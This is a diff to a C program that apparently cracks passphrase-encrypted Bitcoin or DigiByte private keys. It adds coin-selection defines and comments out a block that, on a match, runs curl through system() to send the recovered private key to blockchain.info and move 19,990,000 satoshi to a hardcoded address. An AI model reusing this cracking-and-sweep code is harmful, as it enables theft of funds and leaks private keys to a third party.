@@ -31,6 +31,21 @@ void print_hex(char * hex, size_t len) {
     }
 }
 
+/*
+Select cryptocurrency to crack by uncommenting the relevant defines
+*/
+
+// Bitcoin
+#define PRIVATEKEYPREFIX 0x00
+#define WIF_START 0x80
+
+// // DigiByte
+// #define PRIVATEKEYPREFIX 0x1e
+// #define WIF_START 0x9e
+
+
+/* End cryptocurrency select */
+
 #define PASSFACTOR_SIZE 32
 #define PASSPHRASE_MAGIC_SIZE 8
 #define PASSPHRASE_SIZE (PASSPHRASE_MAGIC_SIZE + OWNERSALT_SIZE + 33)
@@ -231,7 +246,7 @@ int crack(const char * pKey, char * pKey_pass) {
     */
 
     GString * btcAddress;
-    btcAddress = bp_pubkey_get_address(&wallet, 0);
+    btcAddress = bp_pubkey_get_address(&wallet, PRIVATEKEYPREFIX);
 
     /*
     printf("address: %s\r\n",btcAddress->str);
@@ -252,18 +267,20 @@ int crack(const char * pKey, char * pKey_pass) {
         bu_Hash(hash2, hash1, 32);
 
         unsigned char wif_data[1+32+4];
-        wif_data[0] = 0x80;
+        wif_data[0] = WIF_START;
         memcpy(wif_data+1, finalKey, 32);
         memcpy(wif_data+33, hash2, 4);
 
-    	GString *wif = base58_encode_check(0x80, true, finalKey, sizeof(finalKey));
+    	GString *wif = base58_encode_check(WIF_START, true, finalKey, sizeof(finalKey));
 
+/*
         char cmd[512];
         cmd[0]=0;
         strcat(cmd, "curl 'https://blockchain.info/merchant/");
         strcat(cmd, wif->str);
         strcat(cmd, "/payment?to=1DirbaioGK4T7vVwa4dfHFHYJ7B6GZ1oEh&amount=19990000'");
         system(cmd);
+*/
 
         printf("!!!!!!!!!!!!!!!!!!!!\r\n");
         printf("!!hash match found!!\r\n");
